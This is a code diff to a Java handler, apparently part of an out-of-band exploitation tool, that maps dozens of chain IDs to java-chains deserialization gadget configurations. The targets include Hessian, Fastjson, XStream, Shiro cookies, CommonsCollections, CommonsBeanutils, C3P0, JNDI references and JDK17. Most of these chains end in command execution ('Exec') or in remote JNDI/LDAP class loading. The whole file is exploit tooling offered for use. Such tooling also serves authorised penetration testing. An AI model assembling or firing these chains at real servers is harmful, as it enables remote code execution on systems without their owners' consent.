@@ -10,6 +10,8 @@ import java.net.http.HttpResponse;
 import java.nio.charset.StandardCharsets;
 import java.time.Duration;
 import java.util.Base64;
+import java.util.Collections;
+import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Optional;
@@ -59,106 +61,329 @@ public class JavaChainsProxyHandler implements ChainHandler {
     ) {}
 
     // ── OOBserver chain ID → java-chains chain config ─────────────────────────
-    private static final Map<String, ChainDef> CHAIN_MAP = Map.ofEntries(
+    private static final Map<String, ChainDef> CHAIN_MAP;
+    static {
+        Map<String, ChainDef> m = new HashMap<>();
 
-        // ── Hessian1 via Spring JNDI ──────────────────────────────────────────
-        Map.entry("jchains_hessian1_spring",
+        // ── Hessian1 ──────────────────────────────────────────────────────────
+
+        // Spring JNDI1 (PartiallyComparableAdvisorHolder)
+        m.put("jchains_hessian1_spring",
             new ChainDef("HessianPayload",
                 List.of("SpringPartiallyComparableAdvisorHolder", "SpringJndi1"),
-                true, "application/octet-stream")),
+                true, "application/octet-stream"));
 
-        // ── Hessian1 exec (JDK native, no Spring deps on target) ─────────────
-        Map.entry("jchains_hessian1_exec",
+        // exec: JDK native XSLT (no Spring deps on target)
+        m.put("jchains_hessian1_exec",
             new ChainDef("HessianPayload",
                 List.of("XsltOnlyJdk", "JsConvert", "BytecodeConvert", "Exec"),
-                false, "application/octet-stream")),
+                false, "application/octet-stream"));
 
-        // ── Hessian2 via Spring JNDI ──────────────────────────────────────────
-        Map.entry("jchains_hessian2_spring",
+        // Spring JNDI2 (AbstractBeanFactoryPointcutAdvisor)
+        m.put("jchains_hessian1_spring2",
+            new ChainDef("HessianPayload",
+                List.of("SpringAbstractBeanFactoryPointcutAdvisor", "SpringJndi1"),
+                true, "application/octet-stream"));
+
+        // Spring direct exec
+        m.put("jchains_hessian1_spring_exec",
+            new ChainDef("HessianPayload",
+                List.of("SpringAbstractBeanFactoryPointcutAdvisor", "SpringExec"),
+                false, "application/octet-stream"));
+
+        // Secondary deserialization via SwingLazyValue + Spring CB1
+        m.put("jchains_hessian1_secondary",
+            new ChainDef("HessianPayload",
+                List.of("SwingLazyValueUIDefaults", "LazyValueWithDS",
+                        "JavaNativeSerialization", "CommonsBeanutils1",
+                        "TemplatesImpl", "BytecodeConvert", "Exec"),
+                false, "application/octet-stream"));
+
+        // JDK native BCEL (ProxyLazyValue)
+        m.put("jchains_hessian1_bcel",
+            new ChainDef("HessianPayload",
+                List.of("ProxyLazyValueUIDefaults", "LazyValueWithBcel",
+                        "BcelConvert", "BytecodeConvert", "Exec"),
+                false, "application/octet-stream"));
+
+        // Rome1 secondary deserialization
+        m.put("jchains_hessian1_rome1",
+            new ChainDef("HessianPayload",
+                List.of("Rome1", "SignedObject", "JavaNativeSerialization",
+                        "CommonsBeanutils1", "TemplatesImpl", "BytecodeConvert", "Exec"),
+                false, "application/octet-stream"));
+
+        // Rome2 secondary deserialization
+        m.put("jchains_hessian1_rome2",
+            new ChainDef("HessianPayload",
+                List.of("Rome2", "SignedObject", "JavaNativeSerialization",
+                        "CommonsBeanutils1", "TemplatesImpl", "BytecodeConvert", "Exec"),
+                false, "application/octet-stream"));
+
+        // ── Hessian2 ──────────────────────────────────────────────────────────
+
+        // Spring JNDI1
+        m.put("jchains_hessian2_spring",
             new ChainDef("Hessian2Payload",
                 List.of("SpringPartiallyComparableAdvisorHolder", "SpringJndi1"),
-                true, "application/octet-stream")),
+                true, "application/octet-stream"));
 
-        // ── Hessian2 exec (JDK native) ────────────────────────────────────────
-        Map.entry("jchains_hessian2_exec",
+        // exec: JDK native XSLT
+        m.put("jchains_hessian2_exec",
             new ChainDef("Hessian2Payload",
                 List.of("XsltOnlyJdk", "JsConvert", "BytecodeConvert", "Exec"),
-                false, "application/octet-stream")),
+                false, "application/octet-stream"));
 
-        // ── Fastjson JdbcRowSetImpl JNDI (≤1.2.47) ───────────────────────────
-        Map.entry("jchains_fastjson",
+        // Spring JNDI2
+        m.put("jchains_hessian2_spring2",
+            new ChainDef("Hessian2Payload",
+                List.of("SpringAbstractBeanFactoryPointcutAdvisor", "SpringJndi1"),
+                true, "application/octet-stream"));
+
+        // Spring direct exec
+        m.put("jchains_hessian2_spring_exec",
+            new ChainDef("Hessian2Payload",
+                List.of("SpringAbstractBeanFactoryPointcutAdvisor", "SpringExec"),
+                false, "application/octet-stream"));
+
+        // Secondary deserialization
+        m.put("jchains_hessian2_secondary",
+            new ChainDef("Hessian2Payload",
+                List.of("SwingLazyValueUIDefaults", "LazyValueWithDS",
+                        "JavaNativeSerialization", "CommonsBeanutils1",
+                        "TemplatesImpl", "BytecodeConvert", "Exec"),
+                false, "application/octet-stream"));
+
+        // BCEL
+        m.put("jchains_hessian2_bcel",
+            new ChainDef("Hessian2Payload",
+                List.of("ProxyLazyValueUIDefaults", "LazyValueWithBcel",
+                        "BcelConvert", "BytecodeConvert", "Exec"),
+                false, "application/octet-stream"));
+
+        // Rome1 secondary
+        m.put("jchains_hessian2_rome1",
+            new ChainDef("Hessian2Payload",
+                List.of("Rome1", "SignedObject", "JavaNativeSerialization",
+                        "CommonsBeanutils1", "TemplatesImpl", "BytecodeConvert", "Exec"),
+                false, "application/octet-stream"));
+
+        // Rome2 secondary
+        m.put("jchains_hessian2_rome2",
+            new ChainDef("Hessian2Payload",
+                List.of("Rome2", "SignedObject", "JavaNativeSerialization",
+                        "CommonsBeanutils1", "TemplatesImpl", "BytecodeConvert", "Exec"),
+                false, "application/octet-stream"));
+
+        // ── Hessian2ToString ──────────────────────────────────────────────────
+
+        // XBean toString → Tomcat EL
+        m.put("jchains_hessian2_tostring_xbean",
+            new ChainDef("Hessian2ToStringPayload",
+                List.of("XBeanToString", "TomcatElRef", "ElConvert", "BytecodeConvert", "Exec"),
+                false, "application/octet-stream"));
+
+        // Jackson toString secondary deserialization
+        m.put("jchains_hessian2_tostring_jackson",
+            new ChainDef("Hessian2ToStringPayload",
+                List.of("JacksonToString", "SignedObject", "JavaNativeSerialization",
+                        "Jackson", "TWrap", "TemplatesImpl", "BytecodeConvert", "Exec"),
+                false, "application/octet-stream"));
+
+        // ── Fastjson ──────────────────────────────────────────────────────────
+
+        // JdbcRowSetImpl JNDI (≤1.2.47)
+        m.put("jchains_fastjson",
             new ChainDef("FastjsonPayload",
                 List.of("FastjsonJdbcRowSetImpl"),
-                true, "application/json")),
-        Map.entry("jchains_fastjson_jndi",
+                true, "application/json"));
+        m.put("jchains_fastjson_jndi",
             new ChainDef("FastjsonPayload",
                 List.of("FastjsonJdbcRowSetImpl"),
-                true, "application/json")),
+                true, "application/json"));
 
-        // ── Fastjson BCEL (≤1.2.24, needs dbcp+bcel on target) ───────────────
-        Map.entry("jchains_fastjson_bcel",
+        // BCEL (≤1.2.24)
+        m.put("jchains_fastjson_bcel",
             new ChainDef("FastjsonPayload",
                 List.of("FastjsonBasicDataSource", "BcelConvert", "BytecodeConvert", "Exec"),
-                false, "application/json")),
+                false, "application/json"));
 
-        // ── XStream via Spring JNDI ───────────────────────────────────────────
-        Map.entry("jchains_xstream",
+        // C3P0 H2 JDBC (≤1.2.47)
+        m.put("jchains_fastjson_c3p0_h2",
+            new ChainDef("FastjsonPayload",
+                List.of("FastjsonC3p0", "H2JavaJdbc1", "BytecodeConvert", "Exec"),
+                false, "application/json"));
+
+        // ── XStream ───────────────────────────────────────────────────────────
+
+        // Spring JNDI
+        m.put("jchains_xstream",
             new ChainDef("XStreamPayload",
                 List.of("SpringPartiallyComparableAdvisorHolder", "SpringJndi1"),
-                true, "application/xml")),
-        Map.entry("jchains_xstream_jndi",
+                true, "application/xml"));
+        m.put("jchains_xstream_jndi",
             new ChainDef("XStreamPayload",
                 List.of("SpringPartiallyComparableAdvisorHolder", "SpringJndi1"),
-                true, "application/xml")),
+                true, "application/xml"));
 
-        // ── XStream exec (JDK native) ─────────────────────────────────────────
-        Map.entry("jchains_xstream_exec",
+        // JDK native exec
+        m.put("jchains_xstream_exec",
             new ChainDef("XStreamPayload",
                 List.of("XsltOnlyJdk", "JsConvert", "BytecodeConvert", "Exec"),
-                false, "application/xml")),
+                false, "application/xml"));
 
-        // ── Shiro CBC cookie (CommonsBeanutils1 + bytecode exec) ──────────────
-        Map.entry("jchains_shiro_cbc",
+        // ── Shiro ─────────────────────────────────────────────────────────────
+
+        // CB1 AES-CBC cookie
+        m.put("jchains_shiro_cbc",
             new ChainDef("ShiroPayload",
                 List.of("CommonsBeanutils1", "TemplatesImpl", "BytecodeConvert", "Exec"),
-                false, "text/plain")),
+                false, "text/plain"));
 
-        // ── Java native deserialization: CommonsCollections ───────────────────
-        Map.entry("jchains_cc1",
+        // ── JavaNative: CommonsCollections ────────────────────────────────────
+
+        m.put("jchains_cc1",
             new ChainDef("JavaNativePayload",
                 List.of("CommonsCollectionsK1", "TemplatesImpl", "BytecodeConvert", "Exec"),
-                false, "application/octet-stream")),
-        Map.entry("jchains_cc2",
+                false, "application/octet-stream"));
+        m.put("jchains_cc2",
             new ChainDef("JavaNativePayload",
                 List.of("CommonsCollectionsK2", "TemplatesImpl", "BytecodeConvert", "Exec"),
-                false, "application/octet-stream")),
-        Map.entry("jchains_cc3",
+                false, "application/octet-stream"));
+        m.put("jchains_cc3",
             new ChainDef("JavaNativePayload",
-                List.of("CommonsCollectionsK3", "TransformerWithTemplatesImpl", "TemplatesImpl", "BytecodeConvert", "Exec"),
-                false, "application/octet-stream")),
-        Map.entry("jchains_cc4",
+                List.of("CommonsCollectionsK3", "TransformerWithTemplatesImpl",
+                        "TemplatesImpl", "BytecodeConvert", "Exec"),
+                false, "application/octet-stream"));
+        m.put("jchains_cc4",
             new ChainDef("JavaNativePayload",
-                List.of("CommonsCollectionsK4", "TransformerWithTemplatesImpl", "TemplatesImpl", "BytecodeConvert", "Exec"),
-                false, "application/octet-stream")),
-        Map.entry("jchains_cc6",
-            new ChainDef("JavaNativePayload",
-                List.of("CommonsCollectionsK1", "TemplatesImpl", "BytecodeConvert", "Exec"),
-                false, "application/octet-stream")),
-        Map.entry("jchains_native_cc6",
+                List.of("CommonsCollectionsK4", "TransformerWithTemplatesImpl",
+                        "TemplatesImpl", "BytecodeConvert", "Exec"),
+                false, "application/octet-stream"));
+        m.put("jchains_cc6",
             new ChainDef("JavaNativePayload",
                 List.of("CommonsCollectionsK1", "TemplatesImpl", "BytecodeConvert", "Exec"),
-                false, "application/octet-stream")),
+                false, "application/octet-stream"));
+        m.put("jchains_native_cc6",
+            new ChainDef("JavaNativePayload",
+                List.of("CommonsCollectionsK1", "TemplatesImpl", "BytecodeConvert", "Exec"),
+                false, "application/octet-stream"));
 
-        // ── CommonsBeanutils ──────────────────────────────────────────────────
-        Map.entry("jchains_cb1",
+        // ── JavaNative: CommonsBeanutils ──────────────────────────────────────
+
+        // CB1
+        m.put("jchains_cb1",
             new ChainDef("JavaNativePayload",
                 List.of("CommonsBeanutils1", "TemplatesImpl", "BytecodeConvert", "Exec"),
-                false, "application/octet-stream")),
-        Map.entry("jchains_native_cb1",
+                false, "application/octet-stream"));
+        m.put("jchains_native_cb1",
             new ChainDef("JavaNativePayload",
                 List.of("CommonsBeanutils1", "TemplatesImpl", "BytecodeConvert", "Exec"),
-                false, "application/octet-stream"))
-    );
+                false, "application/octet-stream"));
+
+        // CB2 (BeanUtils 1.8.x)
+        m.put("jchains_native_cb2",
+            new ChainDef("JavaNativePayload",
+                List.of("CommonsBeanutils2", "TemplatesImpl", "BytecodeConvert", "Exec"),
+                false, "application/octet-stream"));
+
+        // CB1 JNDI
+        m.put("jchains_native_cb1_jndi",
+            new ChainDef("JavaNativePayload",
+                List.of("CommonsBeanutils1", "JdbcRowSetImpl"),
+                true, "application/octet-stream"));
+
+        // ── JavaNative: Jackson ───────────────────────────────────────────────
+
+        m.put("jchains_native_jackson",
+            new ChainDef("JavaNativePayload",
+                List.of("Jackson", "TWrap", "TemplatesImpl", "BytecodeConvert", "Exec"),
+                false, "application/octet-stream"));
+
+        // ── JavaNative: JDK17 high-version chains ─────────────────────────────
+
+        // JDK17 RCE chain 1 (EventListenerList)
+        m.put("jchains_native_jdk17_1",
+            new ChainDef("JavaNativePayload",
+                List.of("EventListenerListToStringHighJDK", "JacksonToString",
+                        "TWrapHighVersion", "TemplatesImpl2", "BytecodeConvert", "Exec"),
+                false, "application/octet-stream"));
+
+        // JDK17 RCE chain 2 (TextAndMnemonicHashMap)
+        m.put("jchains_native_jdk17_2",
+            new ChainDef("JavaNativePayload",
+                List.of("TextAndMnemonicHashMapToStringHighJDK", "JacksonToString",
+                        "TWrapHighVersion", "TemplatesImpl2", "BytecodeConvert", "Exec"),
+                false, "application/octet-stream"));
+
+        // ── JavaNative: C3P0 ──────────────────────────────────────────────────
+
+        // C3P0 LDAP remote class loader
+        m.put("jchains_native_c3p0_ldap",
+            new ChainDef("JavaNativePayload",
+                List.of("MchangeC3p0Reference", "LdapClassLoader"),
+                true, "application/octet-stream"));
+
+        // C3P0 Tomcat EL exec
+        m.put("jchains_native_c3p0_el",
+            new ChainDef("JavaNativePayload",
+                List.of("MchangeC3p0Reference", "TomcatElRef", "ElConvert",
+                        "BytecodeConvert", "Exec"),
+                false, "application/octet-stream"));
+
+        // ── JavaNative: K1 secondary deserialization ──────────────────────────
+
+        m.put("jchains_native_k1_secondary",
+            new ChainDef("JavaNativePayload",
+                List.of("CommonsCollectionsK1", "SignedObject", "JavaNativeSerialization",
+                        "CommonsCollectionsK3", "TransformerWithTemplatesImpl",
+                        "TemplatesImpl", "BytecodeConvert", "Exec"),
+                false, "application/octet-stream"));
+
+        // ── JNDI Resource Ref payloads (text responses) ───────────────────────
+
+        // Tomcat EL
+        m.put("jchains_jndi_tomcat_el",
+            new ChainDef("JNDIResourceRefPayload",
+                List.of("TomcatElRef", "ElConvert", "BytecodeConvert", "Exec"),
+                false, "text/plain"));
+
+        // Groovy
+        m.put("jchains_jndi_groovy",
+            new ChainDef("JNDIResourceRefPayload",
+                List.of("GroovyShellRef", "GroovyConvert", "BytecodeConvert", "Exec"),
+                false, "text/plain"));
+
+        // SnakeYAML SPI
+        m.put("jchains_jndi_snakeyaml",
+            new ChainDef("JNDIResourceRefPayload",
+                List.of("SnakeyamlRef", "SnakeyamlJarSpi4JNDI",
+                        "SnakeyamlJarConvert", "BytecodeConvert", "Exec"),
+                false, "text/plain"));
+
+        // Beanshell
+        m.put("jchains_jndi_beanshell",
+            new ChainDef("JNDIResourceRefPayload",
+                List.of("BeanshellRef", "BeanshellConvert", "BytecodeConvert", "Exec"),
+                false, "text/plain"));
+
+        // ── H2 JDBC RCE (text/plain JDBC URL with embedded bytecode) ─────────
+
+        m.put("jchains_h2_jdbc",
+            new ChainDef("OtherPayload",
+                List.of("H2JavaJdbc1", "BytecodeConvert", "Exec"),
+                false, "text/plain"));
+
+        // ── BlazeDSAMF3AM — Axis2 gadget ─────────────────────────────────────
+
+        m.put("jchains_blazeds_axis2",
+            new ChainDef("BlazeDSAMF3AMPayload",
+                List.of("Axis2MetaDataEntry", "CommonsBeanutils1",
+                        "TemplatesImpl", "BytecodeConvert", "Exec"),
+                false, "application/octet-stream"));
+
+        CHAIN_MAP = Collections.unmodifiableMap(m);
+    }
 
     /** All chain IDs handled by this proxy (for ChainRegistry auto-registration). */
     public java.util.Set<String> chainIds() { return CHAIN_MAP.keySet(); }
